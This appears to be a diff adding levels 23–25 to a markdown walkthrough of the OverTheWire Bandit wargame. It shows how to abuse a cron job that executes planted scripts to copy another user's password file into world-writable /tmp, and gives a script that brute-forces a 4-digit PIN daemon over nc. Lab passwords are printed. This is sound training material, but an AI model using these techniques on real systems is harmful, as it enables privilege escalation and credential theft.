@@ -766,4 +766,158 @@ QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 
 ```bash
 $ ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
 ```
+
+Let's break down what the above bash script does:
+1. The `myname` variable is assigned the output of the command `whoami` typed by the user `bandin24`. 
+
+  ```bash
+  bandit23@bandit:~$ whoami
+  bandit23
+  ```
+
+2. Then it iterates through all files within the `/var/spool/bandit24/foo` directory, ignores the current (`.`) and previous (`..`) directories, and then checks who is the owner of the file.  
+
+  ```bash
+  bandit23@bandit:/tmp$ stat --format "%U" test.txt
+  bandit23
+  ```
+
+  > [`stat` command in Linux](https://linuxize.com/post/stat-command-in-linux/).
+
+3. If the owner is the user `bandint23`, it executes the script. If the scripts runs for more than 60 seconds, then it will be forcefully terminated. Finally, it deletes the script.
+
+We have to create a script that reads `bandit24`'s password, move it to the `/var/spool/bandit24/foo/` directory, and wait for it to execute. According to the output of `/etc/cron.d/cronjob_bandit24`, it executes every minute, so it should be executed within maximum of 1 minute.
+
+```bash
+# create a new director within /tmp
+bandit23@bandit:~$ mkdir /tmp/lvl_23/
+# move to the newly-created dir
+bandit23@bandit:~$ cd /tmp/lvl_23
+# create the required script
+bandit23@bandit:/tmp/lvl_23$ nano bandit23.sh
+# display the script's content
+bandit23@bandit:/tmp/lvl_23$ cat bandit23.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/lvl_23/lvl_24_pass
+# create the file that the password will be written to
+bandit23@bandit:/tmp/lvl_23$ touch lvl_24_pass
+# give appropriate permissions to the script, directory, and password file
+bandit23@bandit:/tmp/lvl_23$ chmod +rx bandit23.sh
+bandit23@bandit:/tmp/lvl_23$ chmod 777 /tmp/lvl_23
+bandit23@bandit:/tmp/lvl_23$ chmod 777 lvl_24_pass
+# check files' permissions
+bandit23@bandit:/tmp/lvl_23$ ls -la
+total 408
+drwxrwxrwx    2 bandit23 bandit23   4096 Jan  4 17:18 .
+drwxrwx-wt 3062 root     root     405504 Jan  4 17:19 ..
+-rwxrwxr-x    1 bandit23 bandit23     67 Jan  4 17:17 bandit23.sh
+-rwxrwxrwx    1 bandit23 bandit23      0 Jan  4 17:18 lvl_24_pass
+# copy the script to the appropriate directory
+bandit23@bandit:/tmp/bandit23_dir$ cp bandit23.sh /var/spool/bandit24/foo/
+# wait for a minute and check if the file has changed
+bandit23@bandit:/tmp/lvl_23$ cat lvl_24_pass
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
+## [Level 24 &rarr; 25](https://overthewire.org/wargames/bandit/bandit25.html)
+
+> A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called **brute-forcing**. You do not need to create new connections each time.
+
+```bash
+$ ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+We can connect to the listening port using `nc`:
+
+```bash
+bandit24@bandit:/tmp/lvl_24$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+# input the correct flag and a random 4-digit pincode
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
+Wrong! Please enter the correct pincode. Try again.
+```
+
+Now we can create a brute-forcing script to get all the possible combinations. We can loop through all possible 4-digit combinations (`for i in {0000..9999}`), add each pin to the flag separated by a space (`echo "$password $i"`), and then append each sequence to a file (`>> pin_combinations.txt`). Passing the file as it is, i.e., with 10000 combinations, makes the connection to timeout, so we have to split it into 2 separate ones (`split -l 5000 pin_combinations.txt pin_`). We can then pass each file to the daemon listening (`nc localhost 30002 < pin_aa > results_A` & `nc localhost 30002 < pin_ab >> results_A`), and search for a unique row in the final output (`sort results_A | uniq -u`):
+
+```bash
+bandit24@bandit:/tmp/lvl_24$ nano bruteForce.sh
+bandit24@bandit:/tmp/lvl_24$ cat bruteForce.sh
+#!/bin/bash
+
+# set a variable with the previous level flag
+password="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
+# confirm the password
+echo "The password is: $password."
+
+echo "Creating the pin combination file..."
+# iterate through all combinations of a 4-digit password
+for i in {0000..9999}
+do
+        # append the password plus the pin combination separated by a space to a file
+        echo "$password $i" >> pin_combinations.txt
+done
+
+echo "Splitting the file into two..."
+# split the file into 2 separate files
+split -l 5000 pin_combinations.txt pin_
+
+echo "Brute-force starting...passing the first file..."
+# pass the first file and write the results
+nc localhost 30002 < pin_aa > results_A
+
+echo "Brute-force continues...passing the second file..."
+# pass the second file and write the results
+nc localhost 30002 < pin_ab >> results_A
+
+echo "Searching for the flag..."
+# search for the flag
+sort results_A | uniq -u
+```
+
+Now all we have to do, is execute our script:
+
+```bash
+# execute the script
+bandit24@bandit:/tmp/lvl_24$ ./bruteForce.sh
+The password is: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar.
+Creating the pin combination file...
+Splitting the file into two...
+Brute-force starting...passing the first file...
+Brute-force continues...passing the second file...
+Searching for the flag...
+
+Correct!
+Exiting.
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+Timeout. Exiting.
+```
+
+## [Level 25 &rarr; 26](https://overthewire.org/wargames/bandit/bandit26.html)
+
+> Logging in to `bandit26` from `bandit25` should be fairly easy… The shell for user `bandit26` is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.
+
